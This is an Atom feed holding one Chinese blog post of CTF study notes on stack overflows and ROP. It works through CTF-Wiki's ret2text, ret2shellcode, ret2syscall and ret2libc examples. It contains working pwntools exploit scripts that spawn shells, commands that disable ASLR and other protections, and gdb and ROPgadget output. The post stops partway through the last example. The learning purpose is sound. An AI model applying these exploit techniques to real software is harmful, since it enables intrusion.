<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hy0uka</title>
  
  <subtitle>CTF Reverse Pwn Bin IOT</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qywcysry.github.io/"/>
  <updated>2019-06-20T09:26:07.106Z</updated>
  <id>http://qywcysry.github.io/</id>
  
  <author>
    <name>Hy0uka</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF-Wiki Stackflow and ROP</title>
    <link href="http://qywcysry.github.io/2019/06/20/CTF-Wiki/"/>
    <id>http://qywcysry.github.io/2019/06/20/CTF-Wiki/</id>
    <published>2019-06-19T16:06:21.000Z</published>
    <updated>2019-06-20T09:26:07.106Z</updated>
    
    <content type="html"><![CDATA[<p>CTF-Wiki中几道例题的思路</p><p>从栈溢出的基本原理开始，整理下CTF-Wiki中几道经典例题(溢出方式)的思路。</p><p><strong>0X01–栈溢出的基本原理：</strong></p><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。发生栈溢出的基本前提是:<u>1.程序必须向栈上写入数据。2.写入的数据大小没有被很好地控制。</u></p><p>函数调用指令: <strong>CALL</strong>(注意理解EBP的变化过程，它指向下一条指令要操作的数据)</p><p>大致过程:</p><ol><li>参数入栈</li><li>返回地址入栈</li><li>代码区块跳转</li></ol><p>栈帧调整:</p><ol><li>保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)</li><li>将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)</li><li>给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)</li></ol><p><img src="https://p5.ssl.qhimg.com/t01b9be9878dadebed6.png" alt></p><p><strong>0X02–栈溢出的保护类型：</strong></p><p>知己知彼，方能百战不殆。在正式开始栈溢出之前，先来了解一下一个程序在系统中所受到的保护类型，保护类型可在terminal中用checksec+文件名查看。</p><ol><li><p><strong>Canary</strong>：即堆栈保护，不管是设计还是实现都比较简单高效，原理就是插入一个值，在栈溢出发生的高危区域的尾部，当函数返回时检测canary的值是否经过了改变，以此判断栈溢出是否发生 。如果存在溢出可以覆盖位于 TLS (安全传输层协议)中保存的 Canary 值那么就可以实现绕过保护机制。Canary 设计为以字节 \x00 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。<u>编译时的关闭指令：-fno-stack-protector</u></p></li><li><p><strong>ALSR与PIE(Position Independent Executable)</strong>：地址随机化（在 ASLR 关闭、PIE 开启时也可以攻击成功）<br><u>编译时ALSR的关闭指令：echo 0&gt; /proc/sys/kernel/randomize_va_space可更改Linux 系统的 ASLR状态</u>，可以用cat+路径显示相关的参数：<br>0 - 表示关闭进程地址空间随机化。<br>1 - 表示将mmap的基址，stack和vdso页面随机化。<br>2 - 表示在1的基础上增加栈（heap）的随机化。</p><p><u>PIE编译时的关闭指令：-no-pie</u>，不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。</p></li><li><p><strong>Linux平台下的NX,Windows平台上的DEP</strong>：NX即No-eXecute（堆栈不可执行），NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出,成功写入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p></li></ol><p><strong>0X03–编译指令：</strong></p><p>gcc -m32(生成32位编译程序) -fno-stack-protector(不开启栈保护，即不生成canary）-no-pie(关闭pie）</p><p>sudo -s<br>echo 0 &gt; /proc/sys/kernel/randomize_va_space</p><p>($ cat /proc/sys/kernel/randomize_va_space指令检查)<br>exit（关闭ALSR)<br>-z execstack（关闭NX保护）</p><p>test.c -o test(由test.c生成test可执行文件)</p><p>-g(GDB调试)</p><p><strong>0X04–ROP原理：</strong></p><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：</p><ol><li>程序存在溢出，并且可以控制返回地址。</li><li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ol><p>ropgadget，注意命令格式：ROPgadget –binary [文件名] –only’寄存器名|寄存器名’ | grep ‘eax’。</p><p><strong>0X05–四种类型：</strong></p><p><strong>第一种类型ret2text:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void success() </span><br><span class="line">&#123; </span><br><span class="line">puts(“You Hava already controlled it.”); </span><br><span class="line">&#125;</span><br><span class="line">void vulnerable()</span><br><span class="line">&#123;</span><br><span class="line">char s[12];</span><br><span class="line">gets(s);</span><br><span class="line">puts(s);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char **argv) </span><br><span class="line">&#123;</span><br><span class="line">vulnerable();</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只开启了NX enabled，首先找到了gets()函数，存在栈溢出漏洞。然后根据char[]开启的buf地址（EBP-0x14），计算出覆盖到ret addr的距离(buf的起始地址到EBP的长度)，构造出payload=0x14‘a’+’bbbb‘+p32（想要执行的函数地址）。这种类型只说明通过栈溢出可以控制程序流，并没有实际拿到shell，属于特殊情况。</p><p>EXP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##coding=utf8</span><br><span class="line">## 导入pwntools库</span><br><span class="line">from pwn import *</span><br><span class="line">## 构造与程序交互的对象，sh = process(&apos;./文件名&apos;)表示打本地，日自己。</span><br><span class="line">sh = process(&apos;./stack_example&apos;)</span><br><span class="line">## 已知了想要执行的函数地址</span><br><span class="line">success_addr = 0x0804843b</span><br><span class="line">## 构造payload</span><br><span class="line">payload = &apos;a&apos; * 0x14 + &apos;bbbb&apos; + p32(success_addr)</span><br><span class="line">##print可以帮助自己看脚本执行到了哪一步</span><br><span class="line">print p32(success_addr)</span><br><span class="line">## 向程序发送字符串</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">## 将代码交互转换为手工交互</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;There is something amazing here, do you know anything?&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  printf(&quot;Maybe I will tell you next time !&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先找到了gets()函数，存在栈溢出漏洞。然后在secure函数中(给出了完整的文件，再经过IDA反编译)找到了system(“/bin/sh”)的调用(两句代码)。通过改变返回地址直接执行这条语句，就能拿到shell。 属于较简单的ROP，因为拿到shell的语句位置明显，以后拿到题可以直接Ctrl+F试试运气，或者利用 ropgadget，查看是否有 /bin/sh 存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure><p>由于此处反编译显示，该缓冲区的最高点是通过esp索引的，所以需要通过调试，确认其相对于ebp的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class="line">24      gets(buf);</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$eax   : 0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;</span><br><span class="line">$ebx   : 0x00000000</span><br><span class="line">$ecx   : 0xffffffff</span><br><span class="line">$edx   : 0xf7faf870  →  0x00000000</span><br><span class="line">$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;</span><br><span class="line">$ebp   : 0xffffcdc8  →  0x00000000</span><br><span class="line">$esi   : 0xf7fae000  →  0x001b1db0</span><br><span class="line">$edi   : 0xf7fae000  →  0x001b1db0</span><br><span class="line">$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure><p>断点下在Call处<strong><u>为什么是这个Call处？</u></strong>(断点处的语句还没有执行)，可以获取esp，ebp的确切值，已知buf最高点相对于esp的长度，得到buf最高点确切值，得到buf最高点相对于ebp的长度，再加上4就是需要填充的字符串长度。</p><p>每次反编译出来，开头的ebp-xx都是该buf的结束位置，而不是开始位置(栈是由高向低生长的，减了反而要高)，而当前状态下ebp是指向输入的，所以buf的长度就等于两者相减。<strong>计算长度，一般都是两十六进制数相减得到的十六进制加上一个十进制的4(32位的话)。</strong></p><p>EXP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2text&apos;)</span><br><span class="line"></span><br><span class="line">target = 0x0804863a</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;A&apos; * (0x6c+4) + p32(target))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>我觉得这道题倒是让我弄明白了buf的表示，位置关系。</strong></p><p><strong>上面这种类型，ret2text，意思就是这种类型中，可以拿到shell的代码语句连贯存在于text中，关键在于计算出长度。</strong></p><p><strong>第二种类型ret2shellcode：</strong></p><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的<strong>汇编代码</strong>，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限(未开启NX保护，怎么讲的越来越低级了的说)。此次文件的segments是NX disabled，RWX，将shellcode写入bss段中。获得执行system(“/bin/sh”)汇编代码所对应的机器码：asm(<a href="http://shellcraft.sh/" target="_blank" rel="noopener">shellcraft.sh</a>())。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No system for you this time !!!&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  strncpy(buf2, (const char *)&amp;v4, 0x64u);</span><br><span class="line">  printf(&quot;bye bye ~&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段(双击，hh)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure><p>通过vmmap观察该bss段是否可执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8       setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">─────────────────────────────────────────────────────────────────────[ source:ret2shellcode.c+8 ]────</span><br><span class="line">      6  int main(void)</span><br><span class="line">      7  &#123;</span><br><span class="line"> →    8      setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">      9      setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class="line">     10  </span><br><span class="line">─────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x8048536 → Name: main()</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  vmmap </span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class="line">0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7faf000 0xf7fb2000 0x00000000 rwx </span><br><span class="line">0xf7fd3000 0xf7fd5000 0x00000000 rwx </span><br><span class="line">0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffb000 0xf7ffc000 0x00000000 rwx </span><br><span class="line">0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure><p>所在区间为rwx，那么对于此类型就控制程序写入shellcode，再执行shellcode。</p><p>EXP如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">sh = process(&apos;./ret2shellcode&apos;)</span><br><span class="line">## 自动生成shellcode</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = 0x804a080</span><br><span class="line">## shellcode先放入，剩余的再用&apos;A&apos;填充至112长度。</span><br><span class="line">sh.sendline(shellcode.ljust(112, &apos;A&apos;) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong><u>shellcode放进去了不需要别的操作吗？这个buf2_addr指的是什么？如何通过调试确定需要填充的长度？</u></strong></p><p><strong>第三种类型：ret2syscall：</strong><br>即控制函数执行系统调用。简单地说，只要把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>由于该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。</p><p>具体实现–ropgadgets 这个工具:</p><p>only ‘pop|ret’ | grep ‘eax’这类的命令(前面汇编指令，后面寄存器名。)找到gadgets，找到能符合条件改变eax，ebx，ecx，edx的语句，实现execve(“/bin/sh”,NULL,NULL)此系统调用所需要改变四种寄存器的值。再寻找字符串/bin/sh的地址以及命令int 0x80的地址。不同的系统调用所需要改变的寄存器个数与参数是不一样的，所以要寻找的gadgets也是不一样的。</p><p>平凡无奇的存在栈溢出漏洞的程序源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>想知道108+4是怎么算出来的，以及buf的前后两端表示方法，试一试。</strong></p><p>此外，我们需要获得 /bin/sh 字符串对应的地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --string &apos;/bin/sh&apos; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>以及int 0x80的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &apos;int&apos;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>EXP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./rop&apos;)</span><br><span class="line"></span><br><span class="line">## 找到的gadgets及其地址</span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">## flat表示连接，注意此处不是指令是地址，栈中只有地址与参数，这种类型比较奇特。## 注意pop，ret等指令的实际意义，后面接的是它们的参数，其中 0xb 为 execve 对## 应的系统调用号。</span><br><span class="line">payload = flat([&apos;A&apos; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])，pop eax是把栈顶的数字先赋给eax，再弹出/释放。</p><p><strong>第四种类型：ret2libc</strong></p><p>libc是Linux的函数库，ret2libc就是控制程序执行libc中的函数，通常是修改函数返回地址为某个函数的plt处或者函数的具体位置(函数对应的got表项内容)。通常情况下，我们会选择执行system(“/bin/sh”).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;RET2LIBC &gt;_&lt;&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确定存在栈溢出漏洞,<u>用IDA找到了system函数,用ropgadget查找到”/bin/sh”</u>。</p><p>则EXP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2libc1&apos;)</span><br><span class="line"></span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = flat([&apos;a&apos; * 112, system_plt, &apos;b&apos; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</strong></p><hr><p>当查找不到”/bin/sh”时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。</p><p>EXP如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ret2libc2&apos;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat([&apos;a&apos; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>注意payload中的pop_ebx是用来平衡堆栈的。</strong></p><hr><p>同时找不到”/bin/sh”与system()函数地址的情况，用到了两个知识点：</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。</li></ul><p>所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。</p><p>此外，libc中是一定存在”/bin/sh”的，所以字符串地址也可以获取。这方面工具做的很完善。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);</span><br><span class="line">  printf(&quot;Can you find it !?&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：</p><ol><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 /bin/sh 